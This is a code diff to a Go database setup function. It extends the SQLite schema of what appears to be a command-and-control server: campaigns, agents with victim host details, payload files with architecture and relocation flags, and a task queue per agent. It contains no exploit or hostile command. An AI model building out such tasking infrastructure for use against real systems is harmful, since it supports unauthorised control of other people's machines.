@@ -54,23 +54,43 @@ func SetupDB(path string) (*sql.DB, error) {
 
 		`CREATE TABLE IF NOT EXISTS agents (
 			id              INTEGER PRIMARY KEY AUTOINCREMENT,
-			uuid            TEXT    NOT NULL,
+			uuid            TEXT    NOT NULL UNIQUE,
 			campaign_uuid   TEXT    NOT NULL REFERENCES campaigns(uuid) ON DELETE CASCADE,
 			username        TEXT    NOT NULL,
 			hostname        TEXT    NOT NULL,
 			domain          TEXT    NOT NULL,
 			architecture    TEXT    NOT NULL,
-			country         TEXT    NOT NULL
+			country         TEXT    NOT NULL,
+			last_seen       DATETIME DEFAULT CURRENT_TIMESTAMP
 		)`,
 
 		`CREATE TABLE IF NOT EXISTS files (
 			id            INTEGER PRIMARY KEY AUTOINCREMENT,
-			uuid          TEXT    NOT NULL,
+			uuid          TEXT    NOT NULL UNIQUE,
 			campaign_uuid TEXT    NOT NULL REFERENCES campaigns(uuid) ON DELETE CASCADE,
 			name          TEXT    NOT NULL,
 			size          INTEGER NOT NULL,
+			kind          TEXT    NOT NULL DEFAULT '',
+			arch          TEXT    NOT NULL DEFAULT '',
+			has_reloc     INTEGER NOT NULL DEFAULT 0,
+			sha256        TEXT    NOT NULL DEFAULT '',
 			created_at    DATETIME DEFAULT CURRENT_TIMESTAMP
 		)`,
+
+		`CREATE TABLE IF NOT EXISTS tasks (
+			id            INTEGER PRIMARY KEY AUTOINCREMENT,
+			agent_uuid    TEXT    NOT NULL REFERENCES agents(uuid) ON DELETE CASCADE,
+			code          INTEGER NOT NULL,
+			file_type     INTEGER NOT NULL,
+			has_reloc     INTEGER NOT NULL DEFAULT 0,
+			has_args      INTEGER NOT NULL DEFAULT 0,
+			file_uuid     TEXT    REFERENCES files(uuid) ON DELETE CASCADE,
+			args          TEXT,
+			status        INTEGER NOT NULL DEFAULT 0,
+			created_at    DATETIME DEFAULT CURRENT_TIMESTAMP
+		)`,
+
+		`CREATE INDEX IF NOT EXISTS idx_tasks_agent_status ON tasks(agent_uuid, status)`,
 	}
 
 	for _, stmt := range tables {
